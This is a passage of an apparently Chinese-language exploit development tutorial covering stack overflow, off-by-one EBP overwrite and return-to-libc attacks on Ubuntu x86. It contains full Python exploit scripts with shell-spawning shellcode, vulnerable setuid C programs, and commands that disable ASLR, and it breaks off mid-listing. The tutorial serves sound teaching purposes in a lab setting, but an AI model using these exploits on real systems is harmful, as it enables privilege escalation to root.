class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py   </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct  </span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> arg1 = <span class="string">"sploitfun"</span>  </span><br><span class="line"> <span class="comment">#Stack address where shellcode is copied.  </span></span><br><span class="line"> ret_addr = <span class="number">0xbffff274</span>  </span><br><span class="line"> <span class="comment">#Spawn a shell  </span></span><br><span class="line"> <span class="comment">#execve(/bin/sh)  </span></span><br><span class="line"> scode =   <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>  </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  <span class="comment">#unk + RA + NOP's + Shellcode  </span></span><br><span class="line">arg2 = <span class="string">"A"</span> * <span class="number">24</span>  </span><br><span class="line">arg2 += conv(ret_addr);  </span><br><span class="line">arg2 += <span class="string">"\x90"</span> * <span class="number">100</span>  </span><br><span class="line">arg2 += scode  </span><br><span class="line">arg2 += <span class="string">"C"</span> * <span class="number">108</span>  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./test"</span>, arg1, arg2])</span><br></pre></td></tr></table></figure><p>执行上面的<code>exp.py</code>程序，给我们<code>root shell</code></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu8.png" title="图8"><hr><h2 id="Off-By-One-漏洞-基于栈"><a href="#Off-By-One-漏洞-基于栈" class="headerlink" title="Off-By-One 漏洞 (基于栈)"></a>Off-By-One 漏洞 (基于栈)</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>将字符串复制到目标缓冲区可能导致<code>off by one</code>。当<code>源字符串长度等于目标缓冲区长度</code>，单个<code>null</code>字节将被复制到目标缓冲区上方。这里由于目标缓冲区位于堆栈中，所以单个null字节可以覆盖存储在堆栈中的调用者的ebp的最低有效位，这可能导致任意代码的执行。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;   </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;  </span><br><span class="line"> bar(arg); <span class="comment">/* [1] */</span>  </span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;  </span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>];  </span><br><span class="line"><span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [2] */</span>  </span><br><span class="line">&#125;  </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;  </span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">256</span>) &#123; <span class="comment">/* [3] */</span>  </span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"Attempted Buffer Overflow\n"</span>);  </span><br><span class="line">         fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">         <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">   foo(argv[<span class="number">1</span>]); <span class="comment">/* [4] */</span>  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>编译命令：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -fno-<span class="built_in">stack</span>-protector -z execstack -mpreferred-<span class="built_in">stack</span>-boundary=<span class="number">2</span> -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure><p>上述漏洞代码的<code>第[2]行</code>是可能发生<code>off by one</code>溢出的地方。目标缓冲区长度为256，因此长度为256字节的源字符串可能导致任意代码执行。</p><p>使用称为<code>EBP覆盖</code>的技术实现任意代码执行。如果调用者的<code>EBP</code>位于目标缓冲区之上，则在<code>strcpy</code>之后，单个<code>NULL</code>字节将覆盖调用者<code>EBP</code>的<code>LSB</code>。</p><p><strong>反汇编：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"> gdb-peda$ <span class="built_in">set</span> disassembly intel  </span><br><span class="line"> gdb-peda$ disass main  </span><br><span class="line"> Dump of assembler code <span class="keyword">for</span> function main:  </span><br><span class="line">     <span class="number">0x08048497</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">     <span class="number">0x08048498</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">     <span class="number">0x0804849a</span> &lt;+<span class="number">3</span>&gt;:   push   edi  </span><br><span class="line">     <span class="number">0x0804849b</span> &lt;+<span class="number">4</span>&gt;:   sub    esp,<span class="number">0x8</span>  </span><br><span class="line">     <span class="number">0x0804849e</span> &lt;+<span class="number">7</span>&gt;:   mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">    <span class="number">0x080484a1</span> &lt;+<span class="number">10</span>&gt;:  add    eax,<span class="number">0x4</span>  </span><br><span class="line">    <span class="number">0x080484a4</span> &lt;+<span class="number">13</span>&gt;:  mov    eax,DWORD PTR [eax]  </span><br><span class="line">    <span class="number">0x080484a6</span> &lt;+<span class="number">15</span>&gt;:  mov    DWORD PTR [ebp<span class="number">-0x8</span>],<span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="number">0x080484ad</span> &lt;+<span class="number">22</span>&gt;:  mov    edx,eax  </span><br><span class="line">    <span class="number">0x080484af</span> &lt;+<span class="number">24</span>&gt;:  mov    eax,<span class="number">0x0</span>  </span><br><span class="line">    <span class="number">0x080484b4</span> &lt;+<span class="number">29</span>&gt;:  mov    ecx,DWORD PTR [ebp<span class="number">-0x8</span>]  </span><br><span class="line">    <span class="number">0x080484b7</span> &lt;+<span class="number">32</span>&gt;:  mov    edi,edx  </span><br><span class="line">    <span class="number">0x080484b9</span> &lt;+<span class="number">34</span>&gt;:  repnz scas al,BYTE PTR es:[edi]  </span><br><span class="line">    <span class="number">0x080484bb</span> &lt;+<span class="number">36</span>&gt;:  mov    eax,ecx  </span><br><span class="line">    <span class="number">0x080484bd</span> &lt;+<span class="number">38</span>&gt;:  <span class="keyword">not</span>    eax  </span><br><span class="line">    <span class="number">0x080484bf</span> &lt;+<span class="number">40</span>&gt;:  sub    eax,<span class="number">0x1</span>  </span><br><span class="line">    <span class="number">0x080484c2</span> &lt;+<span class="number">43</span>&gt;:  cmp    eax,<span class="number">0x100</span>  </span><br><span class="line">    <span class="number">0x080484c7</span> &lt;+<span class="number">48</span>&gt;:  jbe    <span class="number">0x80484e9</span> &lt;main+<span class="number">82</span>&gt;  </span><br><span class="line">    <span class="number">0x080484c9</span> &lt;+<span class="number">50</span>&gt;:  mov    DWORD PTR [esp],<span class="number">0x80485e0</span>  </span><br><span class="line">    <span class="number">0x080484d0</span> &lt;+<span class="number">57</span>&gt;:  call   <span class="number">0x8048380</span> &lt;<span class="built_in">puts</span>@plt&gt;  </span><br><span class="line">    <span class="number">0x080484d5</span> &lt;+<span class="number">62</span>&gt;:  mov    eax,ds:<span class="number">0x804a020</span>  </span><br><span class="line">    <span class="number">0x080484da</span> &lt;+<span class="number">67</span>&gt;:  mov    DWORD PTR [esp],eax  </span><br><span class="line">    <span class="number">0x080484dd</span> &lt;+<span class="number">70</span>&gt;:  call   <span class="number">0x8048360</span> &lt;fflush@plt&gt;  </span><br><span class="line">    <span class="number">0x080484e2</span> &lt;+<span class="number">75</span>&gt;:  mov    eax,<span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="number">0x080484e7</span> &lt;+<span class="number">80</span>&gt;:  jmp    <span class="number">0x80484fe</span> &lt;main+<span class="number">103</span>&gt;  </span><br><span class="line">    <span class="number">0x080484e9</span> &lt;+<span class="number">82</span>&gt;:  mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">    <span class="number">0x080484ec</span> &lt;+<span class="number">85</span>&gt;:  add    eax,<span class="number">0x4</span>  </span><br><span class="line">    <span class="number">0x080484ef</span> &lt;+<span class="number">88</span>&gt;:  mov    eax,DWORD PTR [eax]  </span><br><span class="line">    <span class="number">0x080484f1</span> &lt;+<span class="number">90</span>&gt;:  mov    DWORD PTR [esp],eax  </span><br><span class="line">    <span class="number">0x080484f4</span> &lt;+<span class="number">93</span>&gt;:  call   <span class="number">0x8048464</span> &lt;foo&gt;  </span><br><span class="line">    <span class="number">0x080484f9</span> &lt;+<span class="number">98</span>&gt;:  mov    eax,<span class="number">0x0</span>  </span><br><span class="line">   <span class="number">0x080484fe</span> &lt;+<span class="number">103</span>&gt;: add    esp,<span class="number">0x8</span>  </span><br><span class="line">   <span class="number">0x08048501</span> &lt;+<span class="number">106</span>&gt;: pop    edi  </span><br><span class="line">   <span class="number">0x08048502</span> &lt;+<span class="number">107</span>&gt;: pop    ebp  </span><br><span class="line">   <span class="number">0x08048503</span> &lt;+<span class="number">108</span>&gt;: ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$   </span><br><span class="line">gdb-peda$ disass bar  </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function bar:  </span><br><span class="line">    <span class="number">0x08048477</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">    <span class="number">0x08048478</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">    <span class="number">0x0804847a</span> &lt;+<span class="number">3</span>&gt;:   sub    esp,<span class="number">0x108</span>  </span><br><span class="line">    <span class="number">0x08048480</span> &lt;+<span class="number">9</span>&gt;:   mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>] </span><br><span class="line">   <span class="number">0x08048483</span> &lt;+<span class="number">12</span>&gt;:  mov    DWORD PTR [esp+<span class="number">0x4</span>],eax  </span><br><span class="line">   <span class="number">0x08048487</span> &lt;+<span class="number">16</span>&gt;:  lea    eax,[ebp<span class="number">-0x100</span>]  </span><br><span class="line">   <span class="number">0x0804848d</span> &lt;+<span class="number">22</span>&gt;:  mov    DWORD PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048490</span> &lt;+<span class="number">25</span>&gt;:  call   <span class="number">0x8048370</span> &lt;<span class="built_in">strcpy</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x08048495</span> &lt;+<span class="number">30</span>&gt;:  leave    </span><br><span class="line">   <span class="number">0x08048496</span> &lt;+<span class="number">31</span>&gt;:  ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$ disass foo  </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function foo:  </span><br><span class="line">   <span class="number">0x08048464</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">   <span class="number">0x08048465</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">   <span class="number">0x08048467</span> &lt;+<span class="number">3</span>&gt;:   sub    esp,<span class="number">0x4</span>  </span><br><span class="line">   <span class="number">0x0804846a</span> &lt;+<span class="number">6</span>&gt;:   mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]  </span><br><span class="line">   <span class="number">0x0804846d</span> &lt;+<span class="number">9</span>&gt;:   mov    DWORD PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048470</span> &lt;+<span class="number">12</span>&gt;:  call   <span class="number">0x8048477</span> &lt;bar&gt;  </span><br><span class="line">   <span class="number">0x08048475</span> &lt;+<span class="number">17</span>&gt;:  leave    </span><br><span class="line">   <span class="number">0x08048476</span> &lt;+<span class="number">18</span>&gt;:  ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure><p><strong>堆栈布局：</strong></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu9.png" title="图9"><p>当我们已经知道<code>256字节</code>的用户输入，用空字节可以覆盖<code>foo的EBP的LSB</code>。所以当<code>foo</code>的存储在目标缓冲区<code>buf</code>之上的<code>EBP</code>被一个<code>NULL</code>字节所覆盖时，<code>ebp</code>从<code>0xbffff2d8</code>变为<code>0xbffff200</code>。从堆栈布局我们可以看到堆栈位置<code>0xbffff200</code>是目标缓冲区<code>buf</code>的一部分，由于用户输入被复制到该目标缓冲区，攻击者可以控制这个堆栈位置<code>0xbffff200</code>，因此他控制指令指针<code>eip</code>使用他可以实现任意代码执行。让我们通过发送一系列256的<code>A</code>来测试它。</p><p><strong>测试步骤1：EBP是否覆盖，从而可能覆盖返回地址？</strong></p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu10.png" title="图10"><p>显示<code>eip</code>已经被<code>AAAA</code>覆盖。</p><p>返回地址位于<code>buf</code>的偏移量<code>0xac</code>处。有了这些信息，我们可以编写一个漏洞利用程序来实现任意的代码执行。</p><p><strong>漏洞代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py  </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct </span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> <span class="comment">#Spawn a shell.   </span></span><br><span class="line"> <span class="comment">#execve(/bin/sh) Size- 28 bytes.  </span></span><br><span class="line"> scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90"</span>  </span><br><span class="line"> ret_addr = <span class="number">0xbffff218</span>  </span><br><span class="line"> <span class="comment">#endianess conversion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)   <span class="comment">#turn Address + NOP's + Shellcode + Junk  </span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">172</span>  </span><br><span class="line">buf += conv(ret_addr)  </span><br><span class="line">buf += <span class="string">"\x90"</span> * <span class="number">30</span>  </span><br><span class="line">buf += scode  </span><br><span class="line">buf += <span class="string">"A"</span> * <span class="number">22</span>  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./test"</span>, buf])</span><br></pre></td></tr></table></figure><p>执行上面的exploit程序给我们root shell，如下所示：</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu11.png" title="图11"><hr><h2 id="使用return-to-libc绕过NX-bit"><a href="#使用return-to-libc绕过NX-bit" class="headerlink" title="使用return-to-libc绕过NX bit"></a>使用return-to-libc绕过NX bit</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p><p><strong>NT Bit</strong>是一种利用缓解技术，使某些内存区域不可执行，并使可执行区域不可写。比如，使数据，堆栈和堆段不可执行，而代码段不可写。在<code>NX Bit</code>打开的情况下，我们基于堆栈的缓冲区溢出的经典方式会失败。应为在经典的方法中，<code>shellcode</code>被复制进堆栈中，返回地址指向<code>shellcode</code>。但是现在由于堆栈不再可执行，我们利用漏洞渗透失败！但是这种环节技术并不是万无一失的。还是有方法绕过<code>NX Bit</code>的。</p><p><strong>漏洞代码：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">   <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [1] */</span>   </span><br><span class="line">   <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]); <span class="comment">/* [2] */</span>  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf); <span class="comment">/* [3] */</span>  </span><br><span class="line">   fflush(<span class="built_in">stdout</span>);  <span class="comment">/* [4] */</span>  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> <strong>编译命令：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure><p>我们可以使用叫做<code>return-to-libc</code>的攻击技术绕过<code>NX bit</code>。这里返回地址被一个特定的<code>libc</code>函数地址覆盖。比如，如果攻击者想要生成一个<code>shell</code>，那么它将使用<code>system（）</code>地址覆盖返回地址，并在堆栈中设置<code>system（）</code>所需的相应参数，以便调用它。在已经放汇编红会之了漏洞代码的堆栈布局后，让我们编写一个漏洞代码来绕过<code>NX</code>位</p><p><strong>攻击代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py  </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct</span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> <span class="comment">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it.   </span></span><br><span class="line"> <span class="comment">#For example system address = libc base address + system offset  </span></span><br><span class="line"> <span class="comment">#where   </span></span><br><span class="line">        <span class="comment">#libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)  </span></span><br><span class="line">        <span class="comment">#system offset     = 0x0003f060 (obtained from "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system")  </span></span><br><span class="line">         system = <span class="number">0xb7e5d0b0</span>        <span class="comment">#0xb7e2000+0x0003f060  </span></span><br><span class="line">         exit = <span class="number">0xb7e50bf0</span>          <span class="comment">#0xb7e2000+0x00032be0     </span></span><br><span class="line">        <span class="comment">#system_arg points to 'sh' substring of 'fflush' string.   </span></span><br><span class="line">        <span class="comment">#To spawn a shell, system argument should be 'sh' and hence this is the reason for adding line [4] in vuln.c.   </span></span><br><span class="line">        <span class="comment">#But incase there is no 'sh' in vulnerable binary, we can take the other approach of pushing 'sh' string at the end of user input!!  </span></span><br><span class="line">system_arg = <span class="number">0xb7f816a0</span>     <span class="comment">#(obtained from hexdump output of the binary)    </span></span><br><span class="line"><span class="comment">#endianess conversion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">     <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num) <span class="comment">#system + exit + system_arg  </span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">268</span>  </span><br><span class="line">buf += conv(system)  </span><br><span class="line">buf += conv(exit)  </span><br><span class="line">buf += conv(system_arg)  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./test"</span>, buf])</span><br></pre></td></tr></table></figure><p>漏洞代码中，需要3个地址。分别为<code>system()</code>，<code>exit()</code>，还有字符<code>sh</code>所在的地址。可以直接用<code>gdb</code>打印出<code>system()</code>,<code>exit()</code>函数的地址。<code>sh</code>字符串的地址可以使用<code>peda</code>插件的<code>find</code>功能直接查找。具体做法如下图所示：</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu12.png" title="图12"><p>然后运行<code>exp.py</code>便可以成功渗透，并给我们<code>shellcode</code>:</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu13.png" title="图13"><hr><h2 id="使用链接的return-to-libc绕过NX-bit"><a href="#使用链接的return-to-libc绕过NX-bit" class="headerlink" title="使用链接的return-to-libc绕过NX bit"></a>使用链接的return-to-libc绕过NX bit</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p><p>有需要攻击者为了成功利用需要调用<code>多个libc</code>函数。链接<code>多个libc</code>函数的一种简单方法是在堆栈中放置一个<code>libc函数</code>地址，但是由于函数参数的原因，所以是不可能的。所以需要用链接的方式绕过检测机制。</p><p><strong>漏洞代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">//test.c  </span><br><span class="line"> #include &lt;stdio.h&gt;  </span><br><span class="line"> #include &lt;string.h&gt;  </span><br><span class="line"> int main(int argc, char* argv[]) </span><br><span class="line"> &#123;  </span><br><span class="line">    char buf[256];  </span><br><span class="line">    seteuid(getuid()); /* Temporarily drop privileges */  </span><br><span class="line">    strcpy(buf,argv[1]);  </span><br><span class="line">    printf(&quot;%s&quot;,buf);  </span><br><span class="line">    fflush(stdout);  </span><br><span class="line">    return 0;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译命令：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -fno-<span class="built_in">stack</span>-protector -g -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure><p>前一篇文章所述，链接<code>setuid</code>，<code>system</code>和<code>exit</code>将允许我们能够利用漏洞代码<code>vuln</code>。但由于以下两个问题，不是一个直接的任务：在堆栈中的同一位置，攻击者将需要放置libc函数的函数参数或一个libc函数的函数参数和另一个libc函数的地址，这显然是不可能的（如下图所示）。其次<code>seteuid_arg</code>应为零。但是由于我们的缓冲区溢出是由于<code>strcpy</code>引起的，所以零变成一个坏的字符，<code>ie</code>这个零之后的字符不会被<code>strcpy()</code>复制到堆栈中。</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu14.png" title="图14"><p>为了在堆栈中放置<code>多个libc</code>函数或其参数，需要使用<code>帧伪造</code>技术。在这种技术中，而不是使用libc函数地址（本例中为seteuid）直接覆盖返回地址，我们用<code>leave ret</code>指令来覆盖它。这允许攻击者将堆栈中的函数参数存储起来，而不会有任何重叠，从而允许调用<code>相应的libc函数</code>，而不会有任何问题。当攻击者伪造帧进行缓冲区溢出时，如下图堆栈布局所示，成功<code>链接libc函数``seteuid</code>, <code>system</code>和 <code>exit</code>:</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu15.png" title="图15"><p>上图中的红色突出显示是返回地址，其中每个<code>leave ret</code>指令调用其上方的<code>libc函数</code>。例如，第一个<code>leave ret</code>指令（位于<code>堆栈地址0xbffff1fc</code>）调用<code>seteuid()</code>，而第二个<code>leave ret</code>(位于<code>堆栈地址0xbffff20c</code>)调用<code>system()</code>,第三个<code>leave ret</code>指令（位于<code>堆栈地址0xbffff21c</code>）调用<code>exit()</code>。</p><img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu16.png" title="图16"><p><strong>利用代码：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 